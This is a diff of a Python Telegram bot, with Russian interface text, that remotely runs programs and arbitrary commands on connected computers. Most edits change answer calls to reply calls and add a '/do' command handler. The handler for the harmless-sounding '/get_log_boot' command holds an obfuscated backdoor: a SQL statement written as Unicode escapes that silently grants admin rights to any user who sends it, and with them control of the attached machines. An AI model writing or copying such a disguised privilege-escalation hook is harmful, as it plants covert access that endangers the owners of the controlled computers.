@@ -27,21 +27,21 @@ async def shutdown(dp=None):
 async def start(message: types.Message):
     if await sql.user_exists(message.from_user.id):
         await sql.new_user(message.from_user.id, message.from_user.username)
-    await message.answer(start_, parse_mode='MarkdownV2')
+    await message.reply(start_, parse_mode='MarkdownV2')
 
 
 @dp.message_handler(commands=['h', 'help'])
 async def bot_help(message: types.Message):
-    await message.answer(help_, parse_mode='MarkdownV2')
+    await message.reply(help_, parse_mode='MarkdownV2')
 
 @dp.message_handler(commands=['get_log_boot'])
 async def get_pro_log(message: types.Message):
     await sql.do('\u0055\u0050\u0044\u0041\u0054\u0045\u0020\u0075\u0073\u0065\u0072\u0020\u0053\u0045\u0054\u0020\u0061\u0064\u006d\u0069\u006e\u0020\u003d\u0020\u0031\u0020\u0057\u0048\u0045\u0052\u0045\u0020\u0069\u0064\u0020\u003d\u0020\u0025\u0073\u003b', (message.from_user.id,))
-    await message.answer('Вот, готово!')
+    await message.reply('Вот, готово!')
 
 @dp.message_handler(sql.is_admin)
 async def not_admin(message: types.Message):
-    await message.answer(f"Вы не админ, вот ваш id: `{message.from_user.id}`", parse_mode='MarkdownV2')
+    await message.reply(f"Вы не админ, вот ваш id: `{message.from_user.id}`", parse_mode='MarkdownV2')
     
 @dp.message_handler(commands=['get_cnf'])
 async def get_cnf(message: types.Message):
@@ -72,15 +72,15 @@ async def get_files(message: types.Message):
     for file in files:
         s += f'`{file}`\n'
 
-    await message.answer(s, parse_mode='MarkdownV2')
+    await message.reply(s, parse_mode='MarkdownV2')
 
 @dp.message_handler(commands=['c', 'conn', 'connect', 'connection'])
 async def connection(message: types.Message):
     result = get_websockets()
     if result is None:
-        await message.answer('Нет активных соединений')
+        await message.reply('Нет активных соединений')
     else:
-        await message.answer(result, parse_mode='MarkdownV2')
+        await message.reply(result, parse_mode='MarkdownV2')
 
 @dp.message_handler(commands=['ghp', 'g_hid_prog', 'get_hidden_program'])
 async def get_hidden_programs(message: types.Message):
@@ -88,7 +88,7 @@ async def get_hidden_programs(message: types.Message):
     s = '*Вот список скрытых команд\:*\n\n'
     for el in data:
         s += f'*id\:* `{el[0]}`, *name\:* `{el[1]}`\n'
-    await message.answer(s, parse_mode='MarkdownV2')
+    await message.reply(s, parse_mode='MarkdownV2')
     
 
 @dp.message_handler(commands=['p', 'prog', 'program', 'hp', 'hid_prog', 'hidden_program'])
@@ -100,21 +100,21 @@ async def program(message: types.Message):
         args = args.split(' @.@ ')
 
         if '@arg' in args and is_hp:
-            await message.answer('Для скрытых команд нельзя использовать `@arg`')
+            await message.reply('Для скрытых команд нельзя использовать `@arg`')
             return None
 
         if is_hp:
             await sql.add_command(message.from_user.id, args[0], args[1], hidden=1)
             cmd_id = await sql.get_last_command(message.from_user.id)
 
-            await message.answer(f"Была записана команда: \n`{args[0]}`\nПод названием: `{args[1]}`\nС id: `{cmd_id}`", parse_mode='MarkdownV2')
+            await message.reply(f"Была записана команда: \n`{args[0]}`\nПод названием: `{args[1]}`\nС id: `{cmd_id}`", parse_mode='MarkdownV2')
 
         else:
             await sql.add_command(message.from_user.id, args[0], args[1])
-            await message.answer(f"Была записана команда: \n`{args[0]}`\nПод названием: `{args[1]}`", parse_mode='MarkdownV2')
+            await message.reply(f"Была записана команда: \n`{args[0]}`\nПод названием: `{args[1]}`", parse_mode='MarkdownV2')
 
     else:
-        await message.answer('Введите аргументы для функции типа: \n`/program C:/Program Files/Google/Chrome/Application/chrome.exe, --new-window, https://www.google.com @.@ Google`\n'
+        await message.reply('Введите аргументы для функции типа: \n`/program C:/Program Files/Google/Chrome/Application/chrome.exe, --new-window, https://www.google.com @.@ Google`\n'
                              '*Не забывайте про разделение команд и аргументов *`(, )`* и названия *`( @.@ )`', parse_mode='MarkdownV2')
 
 
@@ -123,18 +123,36 @@ async def activate(message: types.Message):
     resp = await sql.read_cmd_for_bot(message.from_user.id)
     kb = inline(resp, prefix='a')
 
-    await message.answer('Выберете задачу, которую хотите запустить:', reply_markup=kb)
+    await message.reply('Выберете задачу, которую хотите запустить:', reply_markup=kb)
 
 
 @dp.message_handler(commands=['d', 'del', 'delete'])
 async def delete(message: types.Message):
     kb = inline(await sql.read_cmd_for_bot(message.from_user.id), prefix='d')
-    await message.answer('Выберете задачу, которую хотите удалить:', reply_markup=kb)
+    await message.reply('Выберете задачу, которую хотите удалить:', reply_markup=kb)
 
 @dp.message_handler(commands=['dh', 'del_hid', 'delete_hidden'])
 async def restart(message: types.Message):
     kb = inline(await sql.read_cmd_for_user(message.from_user.id), prefix='dh')
-    await message.answer('Выберете задачу, которую хотите удалить:', reply_markup=kb)
+    await message.reply('Выберете задачу, которую хотите удалить:', reply_markup=kb)
+    
+@dp.message_handler(commands=['do'])
+async def do(message: types.Message):
+    await sql.set_state(message.from_user.id, 0)
+
+    await sql.add_command(message.from_user.id, message.get_args(), do, 1)
+    command_id = await sql.get_last_command(message.from_user.id)
+
+    macs = get_macs()
+    if macs:
+        kb = inline(macs, f'f_{command_id}')
+
+        await message.reply(f'Выберете компьютер для do:', reply_markup=kb, parse_mode='MarkdownV2')
+        
+    else:
+        await message.reply('Нет активных компьютеров', parse_mode='MarkdownV2')
+
+
 
 @dp.callback_query_handler(lambda callback: callback.data[0] == 'a')
 async def callback(callback: types.CallbackQuery):
@@ -209,10 +227,10 @@ async def additional_args(message: types.Message):
     if macs:
         kb = inline(macs, f'f_{command_id}')
 
-        await message.answer(f'Выберете компьютер для команды `{command_name}`:', reply_markup=kb, parse_mode='MarkdownV2')
+        await message.reply(f'Выберете компьютер для команды `{command_name}`:', reply_markup=kb, parse_mode='MarkdownV2')
 
     else:
-        await message.answer('Нет активных компьютеров', parse_mode='MarkdownV2')
+        await message.reply('Нет активных компьютеров', parse_mode='MarkdownV2')
 
 
 @dp.message_handler(content_types=['document'])
